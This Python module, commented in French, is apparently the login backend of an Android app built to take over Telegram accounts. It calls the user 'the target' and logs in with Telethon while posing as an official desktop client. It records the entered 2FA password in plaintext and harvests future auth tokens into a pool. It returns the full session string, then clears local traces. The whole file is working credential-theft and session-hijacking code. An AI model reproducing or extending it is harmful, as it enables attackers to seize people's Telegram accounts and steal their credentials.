# auth_manager.py — login Telegram via Telethon + capture/harvest de jetons.
# La cible saisit numero / code / mot de passe. On ne lit rien d'autre.
# Contrat MainActivity (exact) :
#   "NEED_CODE" / "NEED_PASSWORD" / "ERROR|msg"  -> comparaison exacte / prefixe
#   "OK\x1Fnom\x1Fsession"                       -> separe par \x1F
import os, asyncio, traceback
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

from token_pool import add_token, harvest, pool_line, load_pool, HARVEST_TARGET

FILES = "/data/user/0/com.tgme.app/files"
SESSION_PATH = os.path.join(FILES, "tgme_session.txt")
HASH_PATH = os.path.join(FILES, "phone_code_hash.txt")
LOG_PATH = os.path.join(FILES, "python_log.txt")

API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
DEVICE_MODEL = "Desktop-tgme"
SYSTEM_VERSION = "Windows 10"
APP_VERSION = "5.5.1 x64"

SEP = "\u001F"


def log(msg):
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(str(msg) + "\n")
    except Exception:
        pass


def _read(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read().strip()
    except Exception:
        return ""


def _write(path, txt):
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(txt)
    except Exception:
        pass


def _rm(path):
    try:
        os.remove(path)
    except Exception:
        pass


async def _hint(client):
    try:
        p = await client(functions.account.GetPasswordRequest())
        if p.has_password and p.hint:
            return p.hint
    except Exception as e:
        log("Indice 2FA: %s" % e)
    return ""


async def _login(phone, code, password):
    log("=== START phone=%s code=%s pass=%s"
        % (phone, "oui" if code else "non", "oui" if password else "non"))

    saved = _read(SESSION_PATH)
    if saved:
        log("Session chargee: %s..." % saved[:32])
        session = StringSession(saved)
    else:
        log("Aucune session existante, creation d'une nouvelle.")
        session = StringSession()

    client = TelegramClient(
        session, API_ID, API_HASH,
        device_model=DEVICE_MODEL, system_version=SYSTEM_VERSION,
        app_version=APP_VERSION, lang_code="en", system_lang_code="en-US")

    await client.connect()
    log("Connecte. Autorise=%s" % await client.is_user_authorized())

    try:
        if not code:
            log("Envoi du code request...")
            sent = await client.send_code_request(phone)
            _write(HASH_PATH, sent.phone_code_hash)
            _write(SESSION_PATH, client.session.save())
            log("Session sauvegardee: %s..." % client.session.save()[:32])
            log("Code envoye. Hash=%s" % sent.phone_code_hash)
            return "NEED_CODE"

        phone_code_hash = _read(HASH_PATH)
        log("Sign in avec code et hash...")
        try:
            authz = await client.sign_in(phone=phone, code=code,
                                         phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            hint = await _hint(client)
            if not password:
                log("2FA requise. Indice: %s" % (hint or "(aucun)"))
                return "NEED_PASSWORD"
            log("2FA: %s" % password)
            authz = await client.sign_in(password=password)

        me = await client.get_me()
        log("SUCCES user=%s" % (me.first_name or "User"))

        tok = getattr(authz, "future_auth_token", None)
        if tok:
            add_token(phone, tok.hex())
            log("JETON login %s" % tok.hex())
        else:
            log("Pas de future_auth_token au login.")

        log("Harvest demarre (cible %d)..." % HARVEST_TARGET)
        await harvest(client, phone, password, log)
        log("Pool: %d jeton(s)." % len(load_pool(phone)))
        log(pool_line(phone))

        final = client.session.save()
        _write(SESSION_PATH, final)
        log("Session finale: %s..." % final[:32])

        # on repart propre pour le prochain numero
        _rm(HASH_PATH)
        _rm(SESSION_PATH)
        log("Session et hash nettoyes.")

        return "OK" + SEP + (me.first_name or "User") + SEP + final

    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


def process_login(phone, code="", password=""):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(_login(phone or "", code or "", password or ""))
    except Exception as e:
        log("ERREUR: %s: %s" % (type(e).__name__, e))
        log(traceback.format_exc())
        return "ERROR|%s" % e
    finally:
        loop.close()


login = process_login
main = process_login
